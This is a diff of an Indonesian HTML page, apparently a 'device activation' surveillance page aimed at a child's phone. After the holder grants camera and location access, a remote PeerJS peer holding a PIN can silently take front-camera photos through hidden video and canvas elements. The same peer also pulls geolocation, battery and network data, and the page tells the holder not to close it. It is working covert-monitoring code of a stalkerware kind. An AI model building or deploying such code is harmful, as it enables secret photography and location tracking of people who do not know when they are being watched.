@@ -1,96 +1,107 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Sistem Aktif</title>
-  <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
-  <style>
-    body{font-family:sans-serif;background:#f2f4f7;text-align:center;padding:40px}
-    .card{background:#fff;padding:25px;border-radius:14px;box-shadow:0 6px 14px rgba(0,0,0,.1)}
-    button{padding:14px 22px;border:0;border-radius:10px;background:#3498db;color:#fff;font-size:16px}
-    .ok{color:#2ecc71;font-weight:bold}
-    .off{color:#e74c3c}
-  </style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Aktivasi Perangkat</title>
+<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+<style>
+body{font-family:sans-serif;background:#f2f4f7;text-align:center;padding:25px}
+.card{background:#fff;padding:20px;border-radius:14px;box-shadow:0 6px 14px rgba(0,0,0,.1)}
+input,button{width:100%;padding:14px;margin-top:10px;border-radius:10px;font-size:15px}
+button{background:#3498db;color:#fff;border:0}
+.ok{color:#2ecc71;font-weight:bold}
+</style>
 </head>
 <body>
 
 <div class="card">
-  <h3>🔒 Sistem Pengawasan Aktif</h3>
-  <p>Klik sekali lalu biarkan</p>
+  <h3>🔒 Aktivasi HP</h3>
+  <input id="id" placeholder="Buat ID (bebas)">
+  <input id="pin" placeholder="Buat PIN" type="password">
   <button onclick="aktifkan()">AKTIFKAN</button>
-  <p id="stat" class="off">Status: Belum Aktif</p>
+  <p id="stat"></p>
 </div>
 
 <video id="v" autoplay playsinline style="display:none"></video>
 <canvas id="c" style="display:none"></canvas>
 
 <script>
-  const PAIR_PIN = "1234";          // samakan dengan remote.html
-  const PEER_ID  = "anak_device_01";
+let peer, conn, stream;
+let PAIR_ID="", PAIR_PIN="";
 
-  let stream, peer, conn;
+async function aktifkan(){
+  PAIR_ID = id.value.trim();
+  PAIR_PIN = pin.value.trim();
+  if(!PAIR_ID || !PAIR_PIN){ alert("ID & PIN wajib"); return; }
 
-  async function aktifkan(){
-    try{
-      stream = await navigator.mediaDevices.getUserMedia({video:true});
-      await new Promise((res,rej)=>{
-        navigator.geolocation.getCurrentPosition(res,rej);
-      });
-
-      peer = new Peer(PEER_ID);
-
-      peer.on("connection",(c)=>{
-        c.on("data",(d)=>{
-          if(d.pin !== PAIR_PIN) return;
-          conn = c;
-          if(d.cmd === "FOTO") ambilFoto();
-          if(d.cmd === "LOKASI") kirimLokasi();
-        });
-      });
-
-      document.getElementById("stat").innerHTML =
-        "Status: Aktif & Online ✅<br><small>Jangan ditutup</small>";
-      document.getElementById("stat").className="ok";
-      alert("Aktif. Jangan ditutup.");
-
-    }catch(e){
-      alert("Harus diizinkan agar sistem berjalan");
-    }
-  }
-
-  function ambilFoto(){
-  const v = document.getElementById("v");
-  const c = document.getElementById("c");
-  const ctx = c.getContext("2d");
-
-  v.srcObject = stream;
-
-  v.onloadedmetadata = () => {
-    // Paksa ukuran canvas sama dengan resolusi video
-    c.width  = v.videoWidth;
-    c.height = v.videoHeight;
-
-    // Gambar full frame
-    ctx.drawImage(v, 0, 0, c.width, c.height);
-
-    // Kirim kualitas tinggi
-    conn.send({
-      type: "FOTO",
-      data: c.toDataURL("image/jpeg", 0.9)
+  try{
+    stream = await navigator.mediaDevices.getUserMedia({
+      video:{width:{ideal:1280},height:{ideal:720},facingMode:"user"}
     });
-  };
+    navigator.geolocation.getCurrentPosition(()=>{});
+
+    peer = new Peer(PAIR_ID);
+
+    peer.on("connection",(c)=>{
+      c.on("data",(d)=>{
+        if(d.pin !== PAIR_PIN) return;
+        conn = c;
+        if(d.cmd==="FOTO") ambilFoto();
+        if(d.cmd==="LOKASI") kirimLokasi();
+        if(d.cmd==="STATUS") kirimStatus();
+        if(d.cmd==="PUTUS") conn.close();
+      });
+    });
+
+    document.getElementById("stat").innerHTML =
+      "<span class='ok'>AKTIF ✅ Jangan ditutup</span>";
+
+    kirimBaterai();
+    kirimJaringan();
+
+  }catch(e){
+    alert("Izin kamera & lokasi wajib");
+  }
 }
 
+function ambilFoto(){
+  const v=document.getElementById("v");
+  const c=document.getElementById("c");
+  const ctx=c.getContext("2d");
+  v.srcObject=stream; v.play();
+  setTimeout(()=>{
+    if(v.videoWidth===0) return;
+    c.width=v.videoWidth; c.height=v.videoHeight;
+    ctx.drawImage(v,0,0,c.width,c.height);
+    conn.send({type:"FOTO",data:c.toDataURL("image/jpeg",0.9)});
+  },800);
+}
 
-  function kirimLokasi(){
-    navigator.geolocation.getCurrentPosition(p=>{
-      conn.send({
-        type:"LOKASI",
-        lat:p.coords.latitude,
-        lon:p.coords.longitude
-      });
-    });
-  }
+function kirimLokasi(){
+  navigator.geolocation.getCurrentPosition(p=>{
+    conn.send({type:"LOKASI",lat:p.coords.latitude,lon:p.coords.longitude});
+  });
+}
+
+function kirimStatus(){
+  conn.send({type:"ONLINE"});
+}
+
+function kirimBaterai(){
+  navigator.getBattery().then(b=>{
+    function send(){
+      conn?.send({type:"BATTERY",level:Math.round(b.level*100),charging:b.charging});
+    }
+    send(); b.onlevelchange=send; b.onchargingchange=send;
+  });
+}
+
+function kirimJaringan(){
+  setInterval(()=>{
+    const n=navigator.connection||{};
+    conn?.send({type:"NETWORK",online:navigator.onLine,type:n.effectiveType||"?"});
+  },5000);
+}
 </script>
 
 </body>
